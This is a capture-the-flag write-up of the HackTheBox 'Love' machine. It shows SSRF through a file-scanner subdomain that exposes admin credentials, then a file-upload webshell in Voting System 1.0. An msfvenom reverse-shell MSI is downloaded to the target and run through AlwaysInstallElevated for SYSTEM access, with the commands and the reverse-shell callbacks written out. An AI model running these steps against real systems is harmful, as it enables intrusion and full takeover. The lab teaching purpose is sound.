# HackTheBox: Love Machine Writeup

![Cover Image](https://user-images.githubusercontent.com/87259078/130060544-fa66fe0a-6cf4-4fc9-bef2-acc97f14d981.jpg)

# Synopsis

“Love” is marked as easy difficulty machine which features multiple Apache web server hosting php pages on windows server, the default HTTP port has a login for voters and a another HTTP port is not directly accessible from our IP. A sub domain has a feature to scan files via url mechanism, we scan certain HTTP service (non-default) port which revails credentials of voter admin login. File Upload RCE vulnerability exists on current voting system 1.0, we gain access to user by uploading a webshell. WinPeas output reveals that admin has enabled ‘AlwaysInstallElevated’ via registry, we get system privileges by exploiting it.

# Skills Required

- Web Enumeration
- File Upload Exploitation
- Windows Enumeration
- Group Policy Abuse

# Skills Learned

- Web Enumeration

# Enumeration

```
⛩\> nmap -sT -sV -sC -Pn -v -oA enum 10.129.145.79
Host is up (0.29s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
| http-methods:
|_  Supported Methods: GET
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-18T14:00:16
| Not valid after:  2022-01-18T14:00:16
| MD5:   bff0 1add 5048 afc8 b3cf 7140 6e68 5ff6
|_SHA-1: 83ed 29c4 70f6 4036 a6f4 2d4d 4cf6 18a2 e9e4 96c2
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?
| fingerprint-strings:
|   NULL, SIPOptions, afp:
|_    Host '10.10.14.36' is not allowed to connect to this MariaDB server
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=5/2%Time=608EA90B%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.36'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SIPOptions,4A
SF:,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.36'\x20is\x20not\x20allowed\x2
SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(afp,4A,"F\0\0\x01
SF:\xffj\x04Host\x20'10\.10\.14\.36'\x20is\x20not\x20allowed\x20to\x20conn
SF:ect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 21m32s, deviation: 0s, median: 21m32s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-05-02T13:50:35
|_  start_date: N/A
```

Nmap reveals that target is running HTTP/s on port 80, 5000 & 443, default windows ports, hostname and virtual host. Let’s add hostname and virtual host to hosts file.

```
⛩\> sudo sh -c "echo '10.129.145.79   love.htb staging.love.htb' >> /etc/hosts"
```

Let’s visit the defualt HTTP service.

![Screen Shot 2021-05-02 at 10.33.33.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/55E4CDAA-A4A4-480B-9159-194BA319A3F2/CE5B02C8-A5AD-4556-9123-C2F905EAFEAF_2/Screen%20Shot%202021-05-02%20at%2010.33.33.png)

Login for voting system, PHP version 7.3.27 (not vulnerable). Let’s check non-standard HTTP port (5000).

![Screen Shot 2021-05-02 at 10.37.31.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/55E4CDAA-A4A4-480B-9159-194BA319A3F2/67CC320B-7FD7-4DF1-AF21-6ABDC30D2CA9_2/Screen%20Shot%202021-05-02%20at%2010.37.31.png)

We don’t have permission to access the port/service. Let's check virtual host webpage.

![Screen Shot 2021-05-02 at 10.40.15.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/55E4CDAA-A4A4-480B-9159-194BA319A3F2/5FAE8051-2071-4F5A-8C73-10F9A8D60502_2/Screen%20Shot%202021-05-02%20at%2010.40.15.png)

File Scanner to detect malicious files/signatures. The demo button has a feature that scan takes url as input to scan the hosted files.

![Screen Shot 2021-05-02 at 10.40.51.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/55E4CDAA-A4A4-480B-9159-194BA319A3F2/F9F03CF3-DEBD-45E5-88FF-732FE353E383_2/Screen%20Shot%202021-05-02%20at%2010.40.51.png)

As this is a PHP webpage, let’s host a php webshell on Kali Linux, if it executes it then we can able to get a shell. The below PHP webshell supports Windows, macOS and Linux.

[ivan-sincek/php-reverse-shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell.php)

Modify the IP and Port address from webshell and host it.

```
⛩\> sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Setup a netcat listener.

```
⛩\> nc -lvnp 1234
listening on [any] 1234 ...
```

Scan the hosted file.

![Screen Shot 2021-05-02 at 10.52.24.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/55E4CDAA-A4A4-480B-9159-194BA319A3F2/9F3E19D6-8DBB-4DC1-89AE-43B69AC599AD_2/Screen%20Shot%202021-05-02%20at%2010.52.24.png)

Unfortunately it didn’t run the PHP file on server side, rather it just read the file and displayed the content.

![Screen Shot 2021-05-02 at 10.54.35.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/55E4CDAA-A4A4-480B-9159-194BA319A3F2/FC98071C-5D54-4BB4-B79C-A4222B510B7A_2/Screen%20Shot%202021-05-02%20at%2010.54.35.png)

If it’s just reading the contents of files, then let’s try to read what is running on port 5000. As of now it is not accessible to us, however it is accessible from localhost.

![Screen Shot 2021-05-02 at 11.03.49.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/55E4CDAA-A4A4-480B-9159-194BA319A3F2/5488CEB0-A546-4B51-99D9-56DF8DBA7552_2/Screen%20Shot%202021-05-02%20at%2011.03.49.png)

We got admin credentials of voting system. Let’s try these to creds to login.

![Screen Shot 2021-05-02 at 11.20.25.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/55E4CDAA-A4A4-480B-9159-194BA319A3F2/F664D698-BB98-4891-8535-0FE900667AD5_2/Screen%20Shot%202021-05-02%20at%2011.20.25.png)

It couldn’t able to find the user, probably this sign-in is only for users. Let’s run gobuster to find admin panel.

```
⛩\> gobuster dir -u http://love.htb -t 30 -w ~/tools/SecLists/Discovery/Web-Content/raft-small-words.txt -b 403,500,503,404

-----------SNIP------------
/includes             (Status: 301) [Size: 332] [--> http://love.htb/includes/]
/images               (Status: 301) [Size: 330] [--> http://love.htb/images/]
/admin                (Status: 301) [Size: 329] [--> http://love.htb/admin/]
----------SNIP-------------
```

We got the admin directory, let’s access it and login.

![Screen Shot 2021-05-02 at 11.24.00.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/55E4CDAA-A4A4-480B-9159-194BA319A3F2/D650B947-A95E-4384-B01C-6A41F9D097D6_2/Screen%20Shot%202021-05-02%20at%2011.24.00.png)

We got access to admin dashboard. This looks like AdminLTE template, I know this because I am heavy use of PiHole and it has exact same dashboard.

![Screen Shot 2021-05-02 at 11.24.32.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/55E4CDAA-A4A4-480B-9159-194BA319A3F2/55482331-D91A-4D34-BEA1-7F080C1460A9_2/Screen%20Shot%202021-05-02%20at%2011.24.32.png)

The copyright year is 2018, that means probably vulnerable and it is copyrighted to ‘SourceCodester’. This site provides free source code to programmers that can be used in their applications. Let’s find vulnerability using searchsploit.

```
⛩\> searchsploit "voting system"
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
Online Voting System - Authentication Bypass                                         | php/webapps/43967.py
Online Voting System Project in PHP - 'username' Persistent Cross-Site Scripting     | multiple/webapps/49159.txt
Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)            | php/webapps/49445.py
------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We got three possibly exploits, the first two can’t useful in our situation as we already have access to admin account. Hopefully the third will help us. A file upload vulnerability which can perform remote code execution, but we need to find what part of this dashboard/settings is vulnerable for this.

After reading the code, I believe picture/photo upload section is vulnerable to RCE.

```
def sendPayload():
    if login():
        global payload
        payload = bytes(payload, encoding="UTF-8")
        files  = {'photo':('shell.php',payload,
                    'image/png', {'Content-Disposition': 'form-data'}
```

So, let’s try to upload a profile picture of current user with PHP webshell.

![Screen Shot 2021-05-02 at 11.49.03.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/55E4CDAA-A4A4-480B-9159-194BA319A3F2/8BD921C1-02AC-4EC2-8F6A-F4FA402CDC38_2/Screen%20Shot%202021-05-02%20at%2011.49.03.png)

Before you click on save, make sure to setup a netcat listener. Once you hit save you’d receive a reverse connection.

```
⛩\> nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.36] from (UNKNOWN) [10.129.145.79] 59811
SOCKET: Shell has connected! PID: 6948
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\>whoami
love\phoebe
```

We got user shell. Lets switch it to powershell and read the user flag.

```
PS C:\> Get-content Users/phoebe/Desktop/user.txt
51e24fa8a4cb7186857e1d82ad042eab
```

Let’s run WinPeas and find any possible escalation points/paths.

```
[+] Checking AlwaysInstallElevated
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```

Admin has enabled “alwaysinstallelevated” feature from registry. We can take advantage of this to gain system shell.

[Always Install Elevated](https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path)

For this we can use metasploit exploit module, but I’d like to do this manually.

[Windows AlwaysInstallElevated MSI](https://www.rapid7.com/db/modules/exploit/windows/local/always_install_elevated/)

First we create a MSI file with reverse shell payload using Msfvenom.

```
⛩\> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.36 LPORT=8001 -f msi -o rev.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: rev.msi
```

We host this file and download on target machine.

```
⛩\> sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
PS C:\Users\Phoebe\desktop> Invoke-WebRequest -Uri 'http://10.10.14.36/rev.msi' -OutFile rev.msi
0.14.36/rev.msi' -OutFile rev.msi
```

Now setup a netcat listener and execute that MSI file.

```
⛩\> nc -lvnp 8001
listening on [any] 8001 ...
```

```
PS C:\Users\Phoebe\desktop> msiexec /quiet /i rev.msi
```

![root-optimized.gif.gif](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/55E4CDAA-A4A4-480B-9159-194BA319A3F2/7A79310C-7172-412B-B025-A97D464EF584_2/root-optimized.gif.gif)

```
⛩\> nc -lvnp 8001
listening on [any] 8001 ...
connect to [10.10.14.36] from (UNKNOWN) [10.129.145.79] 59763
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```

Let’s read the root flag.

```
PS C:\> get-Content Users/administrator/desktop/root.txt
get-Content Users/administrator/desktop/root.txt
4a9dfbb33f825ce888427654fa927bb4
```
